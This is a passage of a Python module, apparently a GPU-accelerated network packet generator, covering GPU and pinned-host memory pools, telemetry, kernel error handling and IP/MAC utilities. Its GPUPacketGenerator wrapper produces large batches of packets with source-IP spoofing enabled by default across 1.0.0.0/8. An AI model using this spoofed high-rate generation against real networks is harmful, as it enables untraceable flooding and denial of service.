        self.pool_size = initial_size
        self._buffers = {}
        self._in_use = set()
        
        # Telemetry counters
        self._hits = 0
        self._misses = 0
        self._oom_recoveries = 0
        self._peak_used_bytes = 0
        
        # Configure CuPy memory pool
        mempool = cp.get_default_memory_pool()
        mempool.set_limit(size=initial_size * 2)  # 2x for headroom
        
    def allocate(self, size: int, dtype=cp.uint8) -> cp.ndarray:
        key = (size, dtype)
        
        # Check for reusable buffer
        if key in self._buffers and key not in self._in_use:
            self._hits += 1
            self._in_use.add(key)
            return self._buffers[key]
        
        # Allocate new buffer
        self._misses += 1
        try:
            buffer = cp.zeros(size, dtype=dtype)
            self._buffers[key] = buffer
            self._in_use.add(key)
            self._update_peak()
            return buffer
        except cp.cuda.memory.OutOfMemoryError:
            self._oom_recoveries += 1
            self.clear()  # Try to free memory
            return cp.zeros(size, dtype=dtype)
    
    def release(self, buffer: cp.ndarray):
        key = (buffer.size, buffer.dtype)
        if key in self._in_use:
            self._in_use.discard(key)
    
    def clear(self):
        """Clear all buffers and free GPU memory."""
        self._buffers.clear()
        self._in_use.clear()
        
        mempool = cp.get_default_memory_pool()
        mempool.free_all_blocks()
    
    def _update_peak(self):
        try:
            mempool = cp.get_default_memory_pool()
            used = mempool.used_bytes()
            if used > self._peak_used_bytes:
                self._peak_used_bytes = used
        except Exception:
            pass
        
    def get_stats(self) -> dict:
        """Get memory pool statistics with telemetry."""
        mempool = cp.get_default_memory_pool()
        return {
            "total_bytes": mempool.total_bytes(),
            "used_bytes": mempool.used_bytes(),
            "peak_used_bytes": self._peak_used_bytes,
            "buffers_allocated": len(self._buffers),
            "buffers_in_use": len(self._in_use),
            "pool_hits": self._hits,
            "pool_misses": self._misses,
            "oom_recoveries": self._oom_recoveries,
            "hit_rate_pct": round(
                self._hits / max(1, self._hits + self._misses) * 100.0, 2
            ),
        }


# Global memory pool instance
_gpu_memory_pool: Optional[GPUMemoryPool] = None


class PinnedHostBufferPool:
    """Reusable host buffer pool (prefers pinned/page-locked memory)."""

    def __init__(self, max_bytes: Optional[int] = None):
        env_mb = max(1, _env_int("SAMURAI_GPU_PINNED_MAX_MB", 512))
        default_limit = int(env_mb * 1024 * 1024)
        self._max_bytes = int(max_bytes) if max_bytes is not None else default_limit
        self._limit_mb_seen = int(env_mb)
        self._buffers = OrderedDict()
        self._lock = threading.Lock()
        self._total_nbytes = 0
        self._hits = 0
        self._misses = 0
        self._evictions = 0
        self._alloc_fallbacks = 0
        self._oversize_bypass = 0
        self._high_watermark_bytes = 0
        try:
            from cupyx import empty_pinned as _empty_pinned
        except Exception:
            _empty_pinned = None
        self._empty_pinned = _empty_pinned

    def _buffer_nbytes(self, buf) -> int:
        try:
            return int(getattr(buf, "nbytes", 0) or 0)
        except Exception:
            return 0

    def _allocate_buffer(self, size: int, dtype):
        if self._empty_pinned is not None:
            try:
                return self._empty_pinned((int(size),), dtype=dtype)
            except Exception:
                self._alloc_fallbacks += 1
        return np.empty((int(size),), dtype=dtype)

    def _evict_until_fit(self, extra_nbytes: int, protect_slot: Optional[str] = None):
        if self._max_bytes <= 0:
            return
        while self._buffers and (self._total_nbytes + int(extra_nbytes)) > self._max_bytes:
            old_slot, old_buf = next(iter(self._buffers.items()))
            if protect_slot is not None and old_slot == protect_slot:
                break
            self._buffers.popitem(last=False)
            self._total_nbytes = max(0, self._total_nbytes - self._buffer_nbytes(old_buf))
            self._evictions += 1

    def _set_max_bytes_locked(self, max_bytes: int):
        self._max_bytes = max(1, int(max_bytes))
        self._limit_mb_seen = max(1, self._max_bytes // (1024 * 1024))
        self._evict_until_fit(0)

    def configure(self, max_bytes: Optional[int] = None):
        with self._lock:
            if max_bytes is not None:
                self._set_max_bytes_locked(max_bytes)

    def refresh_limit_from_env(self):
        env_mb = max(1, _env_int("SAMURAI_GPU_PINNED_MAX_MB", self._limit_mb_seen or 512))
        if env_mb != self._limit_mb_seen:
            self._set_max_bytes_locked(int(env_mb * 1024 * 1024))

    def acquire(self, size: int, dtype=np.uint8, key: Optional[str] = None):
        """Acquire a host buffer with at least `size` elements."""
        dtype = np.dtype(dtype)
        slot = key if key is not None else (str(dtype), int(size))
        requested_elems = int(size)
        requested_nbytes = int(requested_elems * dtype.itemsize)
        with self._lock:
            buf = self._buffers.get(slot, None)
            if buf is not None and buf.dtype == dtype and buf.size >= requested_elems:
                self._hits += 1
                self._buffers.move_to_end(slot, last=True)
                return buf

            self._misses += 1

            # Remove incompatible stale entry for this slot before replacement.
            if buf is not None:
                self._buffers.pop(slot, None)
                self._total_nbytes = max(0, self._total_nbytes - self._buffer_nbytes(buf))

            # Oversize requests bypass cache to avoid persistent limit violation.
            if self._max_bytes > 0 and requested_nbytes > self._max_bytes:
                self._oversize_bypass += 1
                return self._allocate_buffer(requested_elems, dtype)

            self._evict_until_fit(requested_nbytes, protect_slot=slot)
            new_buf = self._allocate_buffer(requested_elems, dtype)
            self._buffers[slot] = new_buf
            self._buffers.move_to_end(slot, last=True)
            self._total_nbytes += self._buffer_nbytes(new_buf)
            if self._total_nbytes > self._high_watermark_bytes:
                self._high_watermark_bytes = self._total_nbytes
            return new_buf

    def clear(self):
        with self._lock:
            self._buffers.clear()
            self._total_nbytes = 0

    def get_stats(self) -> dict:
        """Best-effort pinned host-pool stats."""
        with self._lock:
            total_nbytes = int(self._total_nbytes)
            hit_den = max(1, self._hits + self._misses)
            return {
                "buffers_allocated": int(len(self._buffers)),
                "total_nbytes": total_nbytes,
                "max_bytes": int(self._max_bytes),
                "high_watermark_bytes": int(self._high_watermark_bytes),
                "pinned_enabled": int(self._empty_pinned is not None),
                "pool_hits": int(self._hits),
                "pool_misses": int(self._misses),
                "pool_evictions": int(self._evictions),
                "alloc_fallbacks": int(self._alloc_fallbacks),
                "oversize_bypass": int(self._oversize_bypass),
                "hit_rate_pct": round(float(self._hits) * 100.0 / float(hit_den), 2),
            }


_pinned_host_pool: Optional[PinnedHostBufferPool] = None


def get_memory_pool() -> GPUMemoryPool:
    """Get or create the global GPU memory pool."""
    global _gpu_memory_pool
    if _gpu_memory_pool is None:
        _gpu_memory_pool = GPUMemoryPool()
    return _gpu_memory_pool


def get_pinned_host_pool() -> PinnedHostBufferPool:
    """Get or create the global pinned host-memory pool."""
    global _pinned_host_pool
    if _pinned_host_pool is None:
        _pinned_host_pool = PinnedHostBufferPool()
    return _pinned_host_pool


def configure_pinned_host_pool(max_mb: Optional[int] = None, max_bytes: Optional[int] = None) -> None:
    """Configure pinned-host pool capacity at runtime."""
    pool = get_pinned_host_pool()
    if max_bytes is None and max_mb is not None:
        max_bytes = int(max(1, int(max_mb)) * 1024 * 1024)
    if max_bytes is not None:
        pool.configure(max_bytes=int(max_bytes))


# Module-level D2H telemetry counters
_d2h_transfer_count = 0
_d2h_transfer_bytes = 0


def copy_gpu_to_host_pinned(gpu_arr, key: str = "default", stream=None, blocking: bool = True):
    """
    Copy a CuPy GPU array into a reusable host buffer from the global pinned pool.
    Tracks cumulative transfer count and bytes for telemetry.
    """
    global _d2h_transfer_count, _d2h_transfer_bytes
    flat = gpu_arr.reshape(-1)
    n = int(flat.size)
    out = get_pinned_host_pool().acquire(n, dtype=flat.dtype, key=key)[:n]
    flat.get(out=out, stream=stream, blocking=blocking)
    _d2h_transfer_count += 1
    _d2h_transfer_bytes += int(getattr(out, 'nbytes', n))
    return out


def get_pool_telemetry() -> dict:
    """Return a consolidated snapshot of GPU + Host pool telemetry.

    This can be consumed by reporting and live_metrics for TRex-style
    observability.
    """
    result: dict = {
        "d2h_transfer_count": _d2h_transfer_count,
        "d2h_transfer_bytes": _d2h_transfer_bytes,
    }
    try:
        result["gpu_pool"] = get_memory_pool().get_stats()
    except Exception:
        result["gpu_pool"] = {}
    try:
        result["pinned_host_pool"] = get_pinned_host_pool().get_stats()
    except Exception:
        result["pinned_host_pool"] = {}
    return result


# ============================================================================
# Error Handling Utilities
# ============================================================================

class GPUPacketError(Exception):
    """Base exception for GPU packet generation errors."""
    pass


class GPUMemoryError(GPUPacketError):
    """Exception for GPU memory allocation failures."""
    pass


class GPUKernelError(GPUPacketError):
    """Exception for GPU kernel execution failures."""
    pass


def safe_kernel_launch(kernel, grid, block, stream, *args, name="kernel"):
    """
    Safely launch a CUDA kernel with error handling.
    
    Args:
        kernel: The CUDA kernel function
        grid: Grid dimensions
        block: Block dimensions
        stream: CUDA stream
        *args: Kernel arguments
        name: Kernel name for error messages
    
    Raises:
        GPUKernelError: On kernel launch failure
    """
    try:
        norm_stream = _normalize_numba_stream(stream)
        kernel[grid, block, norm_stream](*args)
        if norm_stream is None:
            cuda.synchronize()
    except Exception as e:
        raise GPUKernelError(f"Kernel '{name}' failed: {e}") from e


def check_gpu_available() -> Tuple[bool, str]:
    """
    Check if GPU is available for packet generation.
    
    Returns:
        Tuple of (available, message)
    """
    if not cuda.is_available():
        return False, "CUDA not available"
    
    try:
        device = cuda.get_current_device()
        compute = device.compute_capability
        
        if compute[0] < 3:
            return False, f"GPU compute capability {compute} too low (need 3.0+)"
        
        # Check memory
        meminfo = cuda.current_context().get_memory_info()
        free_mb = meminfo[0] / (1024 * 1024)
        
        if free_mb < 64:
            return False, f"Low GPU memory: {free_mb:.1f} MB free"
        
        return True, f"GPU ready: {device.name}, {free_mb:.0f} MB free, CC {compute[0]}.{compute[1]}"
        
    except Exception as e:
        return False, f"GPU check failed: {e}"


# ============================================================================
# Utility Functions
# ============================================================================

def ip_to_int(ip_str: str) -> int:
    """Convert IP string to integer."""
    return sum([int(x) << (24 - i*8) for i, x in enumerate(ip_str.split('.'))])


def int_to_ip(ip_int: int) -> str:
    """Convert integer to IP string."""
    return f"{(ip_int >> 24) & 0xFF}.{(ip_int >> 16) & 0xFF}.{(ip_int >> 8) & 0xFF}.{ip_int & 0xFF}"


def mac_to_int(mac_str: str) -> int:
    """Convert MAC string (xx:xx:xx:xx:xx:xx) to integer."""
    parts = mac_str.replace("-", ":").split(":")
    return sum([int(x, 16) << (40 - i*8) for i, x in enumerate(parts)])


def int_to_mac(mac_int: int) -> str:
    """Convert integer to MAC string."""
    return ":".join([f"{(mac_int >> (40 - i*8)) & 0xFF:02x}" for i in range(6)])


def parse_subnet(subnet: str) -> Tuple[int, int]:
    """
    Parse CIDR subnet to base IP and mask.
    
    Args:
        subnet: Subnet in CIDR notation (e.g., "192.168.0.0/24")
    
    Returns:
        Tuple of (base_ip_int, mask_bits)
    """
    if subnet is None:
        subnet = "1.0.0.0/8"
    subnet = str(subnet).strip()
    if not subnet:
        raise ValueError("Subnet must not be empty")
    try:
        network = ipaddress.ip_network(subnet, strict=False)
    except ValueError as exc:
        raise ValueError(f"Invalid subnet '{subnet}': {exc}") from exc
    if network.version != 4:
        raise ValueError(f"Only IPv4 subnets are supported: {subnet}")
    return int(network.network_address), int(network.prefixlen)


def get_gpu_info() -> dict:
    """Get GPU information for diagnostics."""
    if not cuda.is_available():
        return {"available": False, "error": "CUDA not available"}
    
    try:
        device = cuda.get_current_device()
        meminfo = cuda.current_context().get_memory_info()
        
        return {
            "available": True,
            "name": device.name.decode() if isinstance(device.name, bytes) else device.name,
            "compute_capability": f"{device.compute_capability[0]}.{device.compute_capability[1]}",
            "total_memory_mb": meminfo[1] / (1024 * 1024),
            "free_memory_mb": meminfo[0] / (1024 * 1024),
            "max_threads_per_block": device.MAX_THREADS_PER_BLOCK,
            "max_shared_memory_per_block": device.MAX_SHARED_MEMORY_PER_BLOCK,
            "warp_size": device.WARP_SIZE
        }
    except Exception as e:
        return {"available": False, "error": str(e)}


class GPUPacketGenerator:
    """Backward-compatible wrapper used by legacy comprehensive tests."""

    def __init__(
        self,
        max_batch_size: int = 100000,
        *,
        real_src_ip: str = "192.168.1.100",
        spoof_ip: bool = True,
        has_ethernet: bool = False,
        spoof_subnet: str = "1.0.0.0/8",
    ):
        self.max_batch_size = int(max(1, max_batch_size))
        self.real_src_ip = str(real_src_ip)
        self.spoof_ip = bool(spoof_ip)
        self.has_ethernet = bool(has_ethernet)
        self.spoof_subnet = str(spoof_subnet or "1.0.0.0/8")

    def generate_batch(self, template_bytes: bytes, batch_size: int):
        count = int(batch_size or 0)
        if count < 0:
            raise ValueError("batch_size must be >= 0")
        if count > self.max_batch_size:
            raise ValueError(
                f"batch_size {count} exceeds max_batch_size {self.max_batch_size}"
            )

        packets_gpu, packet_size = generate_packets_from_template(
            template_bytes=template_bytes,
            count=count,
            real_src_ip=self.real_src_ip,
            spoof_ip=self.spoof_ip,
            has_ethernet=self.has_ethernet,
            spoof_subnet=self.spoof_subnet,
        )
        packets_host = cp.asnumpy(packets_gpu)
        return [
            bytes(packets_host[i * packet_size : (i + 1) * packet_size])
            for i in range(count)
        ]


# ============================================================================
# Module Initialization
# ============================================================================

def _init_module():
    """Initialize the GPU packet module."""
    available, msg = check_gpu_available()
    if available:
        logging.info(f"GPU Packet Module: {msg}")
    else:
        logging.warning(f"GPU Packet Module: {msg}")
    return available


# Try to initialize on import
_GPU_AVAILABLE = _init_module() if cuda.is_available() else False


def is_gpu_available() -> bool:
    """Check if GPU is available for packet generation."""
    return _GPU_AVAILABLE
